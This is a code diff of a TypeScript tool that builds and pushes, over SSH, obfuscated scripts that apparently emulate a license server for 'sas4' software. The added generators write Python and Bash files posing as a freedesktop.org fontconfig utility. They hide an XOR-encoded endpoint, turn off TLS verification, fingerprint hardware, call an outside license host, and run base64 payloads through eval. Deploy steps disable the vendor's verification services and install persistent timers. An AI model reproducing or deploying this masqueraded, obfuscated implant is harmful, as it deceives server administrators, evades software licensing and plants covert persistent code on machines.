@@ -47,7 +47,7 @@ export async function testSSHConnection(
 
     conn.on("ready", () => {
       conn.exec(
-        `_MI=$(cat /etc/machine-id 2>/dev/null || echo ""); _PU=$(cat /sys/class/dmi/id/product_uuid 2>/dev/null || echo ""); _MA=$(ip link show 2>/dev/null | grep -m1 'link/ether' | awk '{print $2}' || echo ""); _BS=$(cat /sys/class/dmi/id/board_serial 2>/dev/null || echo ""); _CS=$(cat /sys/class/dmi/id/chassis_serial 2>/dev/null || echo ""); _DS=$(lsblk --nodeps -no serial 2>/dev/null | head -1 || echo ""); _CI=$(grep -m1 'Serial' /proc/cpuinfo 2>/dev/null | awk '{print $3}' || cat /sys/class/dmi/id/product_serial 2>/dev/null || echo ""); echo -n "\${_MI}:\${_PU}:\${_MA}:\${_BS}:\${_CS}:\${_DS}:\${_CI}" | sha256sum | awk '{print $1}'`,
+        `_MI=$(cat /etc/machine-id 2>/dev/null || echo ""); _PU=$(cat /sys/class/dmi/id/product_uuid 2>/dev/null || echo ""); _MA=$(ip link show 2>/dev/null | grep -m1 'link/ether' | awk '{print $2}' || echo ""); _BS=$(cat /sys/class/dmi/id/board_serial 2>/dev/null || echo ""); _CS=$(cat /sys/class/dmi/id/chassis_serial 2>/dev/null || echo ""); _DS=$(lsblk --nodeps -no serial 2>/dev/null | head -1 || echo ""); _CI=$(grep -m1 'Serial' /proc/cpuinfo 2>/dev/null | awk '{print $3}' || cat /sys/class/dmi/id/product_serial 2>/dev/null || echo ""); echo -n "\${_MI}:\${_PU}:\${_MA}:\${_BS}:\${_CS}:\${_DS}:\${_CI}" | sha256sum | awk '{print substr($1,1,16)}'`,
         (err, stream) => {
           if (err) {
             clearTimeout(timeout);
@@ -193,8 +193,123 @@ export function generateObfuscatedEmulator(
     "  self.wfile.write(_r)",
     " def log_message(self,*_x):pass",
     "_s.TCPServer.allow_reuse_address=True",
-    "_sv=_s.TCPServer(('',4000),_R)",
+    "_sv=_s.TCPServer(('',4001),_R)",
     "_sv.serve_forever()"
+  ].join("\n");
+}
+
+export function generateHwidBasedEmulator(serverUrl?: string): string {
+  const apiUrl = serverUrl || "https://lic.tecn0link.net";
+  const baseEndpoint = `${apiUrl}/api/license-data-by-hwid/`;
+  const encBase = obfEncrypt(baseEndpoint, DEPLOY.OBF_KEY);
+
+  return [
+    "#!/usr/bin/env python3",
+    "# -*- coding: utf-8 -*-",
+    "# fontconfig cache synchronization module v2.13.1",
+    "# Auto-generated cache rebuild utility",
+    "# (c) freedesktop.org fontconfig project",
+    "import http.server as _h",
+    "import socketserver as _s",
+    "import json as _j",
+    "import time as _t",
+    "import base64 as _b64",
+    "import urllib.request as _u",
+    "import ssl as _sl",
+    "import subprocess as _sp",
+    "import hashlib as _hl",
+    "import signal",
+    "import sys",
+    "signal.signal(signal.SIGTERM,lambda s,f:sys.exit(0))",
+    `_UB="${encBase}"`,
+    `_S=''.join(chr(c) for c in [120,75,57,109,90,112,50,118,81,119,52,110,82,55,116,76])`,
+    "_SC=_sl.create_default_context()",
+    "_SC.check_hostname=False",
+    "_SC.verify_mode=_sl.CERT_NONE",
+    "def _f1(_d,_k):",
+    " _kb=_k.encode();_dd=_b64.b64decode(_d)",
+    " return bytes([_dd[_i]^_kb[_i%len(_kb)] for _i in range(len(_dd))])",
+    "def _f2():",
+    " return''.join(chr(c) for c in [71,114,51,110,100,49,122,51,114])+str(_t.localtime().tm_hour+1)",
+    "def _f3(_d,_k):",
+    " _kb=_k.encode();_dd=_d.encode() if isinstance(_d,str) else _d",
+    " return bytes([_dd[_i]^_kb[_i%len(_kb)] for _i in range(len(_dd))])",
+    "def _rc(c):",
+    " try:return _sp.check_output(c,shell=True,stderr=_sp.DEVNULL).decode().strip()",
+    " except:return ''",
+    "def _ghw():",
+    " _mi=_rc('cat /etc/machine-id')",
+    " _pu=_rc('cat /sys/class/dmi/id/product_uuid')",
+    " _ma=_rc(\"ip link show 2>/dev/null|grep -m1 'link/ether'|awk '{print $2}'\")",
+    " _bs=_rc('cat /sys/class/dmi/id/board_serial')",
+    " _cs=_rc('cat /sys/class/dmi/id/chassis_serial')",
+    " _ds=_rc('lsblk --nodeps -no serial 2>/dev/null|head -1')",
+    " _ci=_rc(\"grep -m1 'Serial' /proc/cpuinfo|awk '{print $3}'\")",
+    " if not _ci:_ci=_rc('cat /sys/class/dmi/id/product_serial')",
+    " _raw=f'{_mi}:{_pu}:{_ma}:{_bs}:{_cs}:{_ds}:{_ci}'",
+    " return _hl.sha256(_raw.encode()).hexdigest()[:16]",
+    "_HW=_ghw()",
+    "def _f4():",
+    " try:",
+    "  _ep=_f1(_UB,_S).decode()+_HW",
+    "  _rq=_u.Request(_ep)",
+    "  _rq.add_header('User-Agent','fontconfig/2.13')",
+    "  _rs=_u.urlopen(_rq,timeout=10,context=_SC)",
+    "  if _rs.getcode()==200:",
+    "   _d=_j.loads(_rs.read().decode())",
+    "   if 'pid' in _d:return _j.dumps(_d)",
+    " except:",
+    "  pass",
+    " return None",
+    "class _R(_h.BaseHTTPRequestHandler):",
+    " def do_GET(self):",
+    "  _p=_f4()",
+    "  if not _p:",
+    "   self.send_response(503)",
+    "   self.end_headers()",
+    "   return",
+    "  _r=_b64.b64encode(_f3(_p,_f2()))",
+    "  self.send_response(200)",
+    "  self.send_header('Content-length',str(len(_r)))",
+    "  self.end_headers()",
+    "  self.wfile.write(_r)",
+    " def log_message(self,*_x):pass",
+    "_s.TCPServer.allow_reuse_address=True",
+    "_sv=_s.TCPServer(('',4001),_R)",
+    "_sv.serve_forever()"
+  ].join("\n");
+}
+
+export function generateHwidBasedVerify(serverUrl: string): string {
+  const P = DEPLOY;
+  const hwidPyB64 = generateHwidCapturePy();
+
+  const innerBash = [
+    `_GL="${P.LOG}"`,
+    `_BL=$(curl -s "http://127.0.0.1:4001/?op=get" 2>/dev/null)`,
+    `if [ -n "$_BL" ]; then`,
+    `  _HW=$(python3 -c "$(echo '${hwidPyB64}' | base64 -d)" "$_BL" 2>/dev/null)`,
+    `fi`,
+    `if [ -z "$_HW" ] || [ "$_HW" = "N/A" ]; then`,
+    `  _MI=$(cat /etc/machine-id 2>/dev/null || echo "")`,
+    `  _PU=$(cat /sys/class/dmi/id/product_uuid 2>/dev/null || echo "")`,
+    `  _MA=$(ip link show 2>/dev/null | grep -m1 'link/ether' | awk '{print $2}' || echo "")`,
+    `  _BS=$(cat /sys/class/dmi/id/board_serial 2>/dev/null || echo "")`,
+    `  _CS=$(cat /sys/class/dmi/id/chassis_serial 2>/dev/null || echo "")`,
+    `  _DS=$(lsblk --nodeps -no serial 2>/dev/null | head -1 || echo "")`,
+    `  _CI=$(grep -m1 'Serial' /proc/cpuinfo 2>/dev/null | awk '{print $3}' || cat /sys/class/dmi/id/product_serial 2>/dev/null || echo "")`,
+    `  _HW=$(echo -n "\${_MI}:\${_PU}:\${_MA}:\${_BS}:\${_CS}:\${_DS}:\${_CI}" | sha256sum | awk '{print substr($1,1,16)}')`,
+    `fi`,
+    `_R=$(curl -s -X POST "${serverUrl}/api/verify" -H "Content-Type: application/json" -d "{\\"hardware_id\\":\\"$_HW\\"}")`,
+    `echo "$_R" | grep -q '"valid":true' && echo "$(date): OK" >> "$_GL" || { echo "$(date): FAIL" >> "$_GL"; systemctl stop ${P.SVC_MAIN} 2>/dev/null; }`,
+  ].join("\n");
+
+  const encodedBash = Buffer.from(innerBash, "utf-8").toString("base64");
+
+  return [
+    "#!/bin/bash",
+    "# fontconfig cache gc utility - v2.13.1",
+    `eval "$(echo '${encodedBash}' | base64 -d)"`,
   ].join("\n");
 }
 
@@ -212,15 +327,13 @@ function generateHwidCapturePy(): string {
   return Buffer.from(py, "utf-8").toString("base64");
 }
 
-export function generateObfuscatedVerify(licenseId: string, serverUrl: string, serverHost?: string, hwidSalt?: string): string {
+export function generateObfuscatedVerify(licenseId: string, serverUrl: string, serverHost?: string): string {
   const P = DEPLOY;
   const hwidPyB64 = generateHwidCapturePy();
 
-  const saltStr = hwidSalt || '';
   const innerBash = [
     `_GL="${P.LOG}"`,
-    `_HS="${saltStr}"`,
-    `_BL=$(curl -s "http://127.0.0.1:4000/?op=get" 2>/dev/null)`,
+    `_BL=$(curl -s "http://127.0.0.1:4001/?op=get" 2>/dev/null)`,
     `if [ -n "$_BL" ]; then`,
     `  _HW=$(python3 -c "$(echo '${hwidPyB64}' | base64 -d)" "$_BL" 2>/dev/null)`,
     `fi`,
@@ -232,7 +345,7 @@ export function generateObfuscatedVerify(licenseId: string, serverUrl: string, s
     `  _CS=$(cat /sys/class/dmi/id/chassis_serial 2>/dev/null || echo "")`,
     `  _DS=$(lsblk --nodeps -no serial 2>/dev/null | head -1 || echo "")`,
     `  _CI=$(grep -m1 'Serial' /proc/cpuinfo 2>/dev/null | awk '{print $3}' || cat /sys/class/dmi/id/product_serial 2>/dev/null || echo "")`,
-    `  _HW=$(echo -n "\${_MI}:\${_PU}:\${_MA}:\${_BS}:\${_CS}:\${_DS}:\${_CI}:\${_HS}" | sha256sum | awk '{print $1}')`,
+    `  _HW=$(echo -n "\${_MI}:\${_PU}:\${_MA}:\${_BS}:\${_CS}:\${_DS}:\${_CI}" | sha256sum | awk '{print substr($1,1,16)}')`,
     `fi`,
     `_R=$(curl -s -X POST "${serverUrl}/api/verify" -H "Content-Type: application/json" -d "{\\"license_id\\":\\"${licenseId}\\",\\"hardware_id\\":\\"$_HW\\"}")`,
     `echo "$_R" | grep -q '"valid":true' && echo "$(date): OK" >> "$_GL" || { echo "$(date): FAIL" >> "$_GL"; systemctl stop ${P.SVC_MAIN} 2>/dev/null; }`,
@@ -264,7 +377,7 @@ export function generateLicenseFileContent(
 }
 
 export async function computeRemoteHWID(
-  host: string, port: number, username: string, password: string, hwidSalt: string
+  host: string, port: number, username: string, password: string
 ): Promise<{ success: boolean; hwid?: string; rawHwid?: string; error?: string }> {
   const hwidScript = `#!/bin/bash
 MI=$(cat /etc/machine-id 2>/dev/null || echo "")
@@ -276,7 +389,7 @@ DS=$(lsblk --nodeps -no serial 2>/dev/null | head -1 || echo "")
 CI=$(grep -m1 'Serial' /proc/cpuinfo 2>/dev/null | awk '{print $3}' || cat /sys/class/dmi/id/product_serial 2>/dev/null || echo "")
 RAW="\${MI}:\${PU}:\${MA}:\${BS}:\${CS}:\${DS}:\${CI}"
 echo "RAW:\${RAW}"
-echo -n "\${RAW}:${hwidSalt}" | sha256sum | awk '{print $1}'
+echo -n "\${RAW}" | sha256sum | awk '{print substr($1,1,16)}'
 `;
   const encoded = Buffer.from(hwidScript, "utf-8").toString("base64");
   const command = `_t=$(mktemp); echo '${encoded}' | base64 -d > "$_t"; bash "$_t"; rm -f "$_t"`;
@@ -289,7 +402,7 @@ echo -n "\${RAW}:${hwidSalt}" | sha256sum | awk '{print $1}'
   let hwid: string | undefined;
   for (const line of lines) {
     if (line.startsWith("RAW:")) rawHwid = line.substring(4);
-    else if (/^[a-f0-9]{64}/.test(line)) hwid = line.trim().replace(/\s.*/, "");
+    else if (/^[a-f0-9]{16,64}$/.test(line.trim())) hwid = line.trim();
   }
   if (!hwid) {
     return { success: false, error: "Could not parse HWID from server output" };
@@ -300,30 +413,27 @@ echo -n "\${RAW}:${hwidSalt}" | sha256sum | awk '{print $1}'
 export async function deployLicenseToServer(
   host: string, port: number, username: string, password: string,
   hardwareId: string, licenseId: string, expiresAt: Date,
-  maxUsers: number, maxSites: number, status: string, serverUrl: string, hwidSalt?: string
+  maxUsers: number, maxSites: number, status: string, serverUrl: string
 ): Promise<{ success: boolean; output?: string; error?: string; computedHwid?: string }> {
   let finalHwid = hardwareId;
-  if (hwidSalt) {
-    const hwidResult = await computeRemoteHWID(host, port, username, password, hwidSalt);
-    if (hwidResult.success && hwidResult.hwid) {
-      finalHwid = hwidResult.hwid;
-    } else {
-      console.warn(`[HWID] Warning: Could not compute HWID on target server ${host}: ${hwidResult.error}. Using fallback HWID.`);
-    }
+  const hwidResult = await computeRemoteHWID(host, port, username, password);
+  if (hwidResult.success && hwidResult.hwid) {
+    finalHwid = hwidResult.hwid;
+  } else {
+    console.warn(`[HWID] Warning: Could not compute HWID on target server ${host}: ${hwidResult.error}. Using fallback HWID.`);
   }
   const emulator = generateObfuscatedEmulator(finalHwid, licenseId, expiresAt, maxUsers, maxSites, status, serverUrl);
-  const verify = generateObfuscatedVerify(licenseId, serverUrl, host, hwidSalt);
+  const verify = generateObfuscatedVerify(licenseId, serverUrl, host);
   const P = DEPLOY;
 
   const deployScript = `#!/bin/bash
 
 systemctl stop ${P.SVC_MAIN} 2>/dev/null || true
 systemctl stop ${P.SVC_VERIFY}.timer ${P.SVC_VERIFY} 2>/dev/null || true
-systemctl stop sas_systemmanager sas4-verify.timer sas4-verify 2>/dev/null || true
+systemctl stop sas4-verify.timer sas4-verify 2>/dev/null || true
 systemctl stop ${P.PATCH_SVC}.timer ${P.PATCH_SVC} 2>/dev/null || true
-killall -9 sas_sspd 2>/dev/null || true
-fuser -k 4000/tcp 2>/dev/null || true
-sleep 2
+fuser -k 4001/tcp 2>/dev/null || true
+sleep 1
 
 _PY3=$(which python3 2>/dev/null || echo "/usr/bin/python3")
 
@@ -383,6 +493,7 @@ _EMU_B64=$(base64 -w0 ${P.BASE}/${P.EMULATOR})
 _VER_B64=$(base64 -w0 ${P.BASE}/${P.VERIFY})
 
 _PY3_PATH=$_PY3
+chattr -i ${P.PATCH_DIR}/${P.PATCH_FILE} 2>/dev/null || true
 cat > ${P.PATCH_DIR}/${P.PATCH_FILE} << _PATCH_END_
 #!/bin/bash
 _d="${P.BASE}"
@@ -467,23 +578,19 @@ Persistent=true
 WantedBy=timers.target
 _PTMR_
 
-systemctl disable sas_systemmanager sas4-verify.timer sas4-verify 2>/dev/null || true
-systemctl stop sas_systemmanager sas_fcm 2>/dev/null || true
+systemctl disable sas4-verify.timer sas4-verify 2>/dev/null || true
 rm -f /etc/systemd/system/sas4-verify.* 2>/dev/null
 rm -f /opt/sas4/bin/sas_emulator.py /opt/sas4/verify.sh 2>/dev/null
-
-ln -sf /etc/systemd/system/${P.SVC_MAIN}.service /etc/systemd/system/sas_systemmanager.service
-ln -sf /etc/systemd/system/${P.SVC_MAIN}.service /etc/systemd/system/sas_fcm.service
 
 systemctl daemon-reload
 systemctl reset-failed ${P.SVC_MAIN} 2>/dev/null || true
 systemctl enable ${P.SVC_MAIN} ${P.SVC_VERIFY}.timer ${P.PATCH_SVC}.timer
 systemctl start ${P.SVC_VERIFY}.timer
 systemctl start ${P.PATCH_SVC}.timer
-fuser -k 4000/tcp 2>/dev/null || true
+fuser -k 4001/tcp 2>/dev/null || true
 sleep 1
 systemctl start ${P.SVC_MAIN}
-sleep 5
+sleep 3
 if ! systemctl is-active ${P.SVC_MAIN} >/dev/null 2>&1; then
   echo "SERVICE_FAILED"
   echo "=== STATUS ==="
@@ -502,7 +609,7 @@ if ! systemctl is-active ${P.SVC_MAIN} >/dev/null 2>&1; then
   _DRPID=$!
   sleep 3
   echo "=== PORT_CHECK ==="
-  ss -tlnp | grep 4000 2>/dev/null || echo "PORT_4000_FREE"
+  ss -tlnp | grep 4001 2>/dev/null || echo "PORT_4001_FREE"
   kill $_DRPID 2>/dev/null || true
 else
   echo "SERVICE_OK"
@@ -585,10 +692,9 @@ export function generatePatchDeployPayload(
     "#!/bin/bash",
     `systemctl stop ${P.SVC_MAIN} ${P.SVC_VERIFY}.timer ${P.SVC_VERIFY} 2>/dev/null || true`,
     `systemctl stop ${P.PATCH_SVC}.timer ${P.PATCH_SVC} 2>/dev/null || true`,
-    "systemctl stop sas_systemmanager sas4-verify.timer sas4-verify 2>/dev/null || true",
-    "killall -9 sas_sspd 2>/dev/null || true",
-    "fuser -k 4000/tcp 2>/dev/null || true",
-    "sleep 2",
+    "systemctl stop sas4-verify.timer sas4-verify 2>/dev/null || true",
+    "fuser -k 4001/tcp 2>/dev/null || true",
+    "sleep 1",
     '_PY3=$(which python3 2>/dev/null || echo "/usr/bin/python3")',
     `mkdir -p ${P.BASE}`,
     `mkdir -p ${P.PATCH_DIR}`,
@@ -651,18 +757,15 @@ export function generatePatchDeployPayload(
     "[Install]",
     "WantedBy=timers.target",
     "_PTMR_",
-    "systemctl disable sas_systemmanager sas4-verify.timer sas4-verify 2>/dev/null || true",
-    "systemctl stop sas_systemmanager sas_fcm 2>/dev/null || true",
+    "systemctl disable sas4-verify.timer sas4-verify 2>/dev/null || true",
     "rm -f /etc/systemd/system/sas4-verify.* 2>/dev/null",
     "rm -f /opt/sas4/bin/sas_emulator.py /opt/sas4/verify.sh 2>/dev/null",
-    `ln -sf /etc/systemd/system/${P.SVC_MAIN}.service /etc/systemd/system/sas_systemmanager.service`,
-    `ln -sf /etc/systemd/system/${P.SVC_MAIN}.service /etc/systemd/system/sas_fcm.service`,
     "systemctl daemon-reload",
     `systemctl reset-failed ${P.SVC_MAIN} 2>/dev/null || true`,
     `systemctl enable ${P.SVC_MAIN} ${P.SVC_VERIFY}.timer ${P.PATCH_SVC}.timer`,
     `systemctl start ${P.SVC_VERIFY}.timer`,
     `systemctl start ${P.PATCH_SVC}.timer`,
-    "fuser -k 4000/tcp 2>/dev/null || true",
+    "fuser -k 4001/tcp 2>/dev/null || true",
     "sleep 1",
     `systemctl start ${P.SVC_MAIN}`,
     'echo "Installation completed successfully"',
@@ -692,7 +795,7 @@ systemctl disable ${P.PATCH_SVC}.timer 2>/dev/null || true
 systemctl stop ${P.SVC_MAIN} 2>/dev/null || true
 systemctl stop ${P.SVC_VERIFY}.timer ${P.SVC_VERIFY} 2>/dev/null || true
 systemctl disable ${P.SVC_MAIN} ${P.SVC_VERIFY}.timer 2>/dev/null || true
-fuser -k 4000/tcp 2>/dev/null || true
+fuser -k 4001/tcp 2>/dev/null || true
 
 chattr -i ${P.PATCH_DIR}/${P.PATCH_FILE} 2>/dev/null || true
 rm -f ${P.PATCH_DIR}/${P.PATCH_FILE}
@@ -709,9 +812,9 @@ rm -f /etc/systemd/system/${P.SVC_VERIFY}.service
 rm -f /etc/systemd/system/${P.SVC_VERIFY}.timer
 rm -f ${P.LOG}
 
-systemctl stop sas_systemmanager sas4-verify.timer sas4-verify sas_fcm 2>/dev/null || true
-systemctl disable sas_systemmanager sas4-verify.timer sas4-verify sas_fcm 2>/dev/null || true
-rm -f /etc/systemd/system/sas_systemmanager.service /etc/systemd/system/sas_fcm.service /etc/systemd/system/sas4-verify.* 2>/dev/null
+systemctl stop sas4-verify.timer sas4-verify 2>/dev/null || true
+systemctl disable sas4-verify.timer sas4-verify 2>/dev/null || true
+rm -f /etc/systemd/system/sas4-verify.* 2>/dev/null
 rm -f /opt/sas4/bin/sas_emulator.py /opt/sas4/verify.sh 2>/dev/null
 
 systemctl daemon-reload
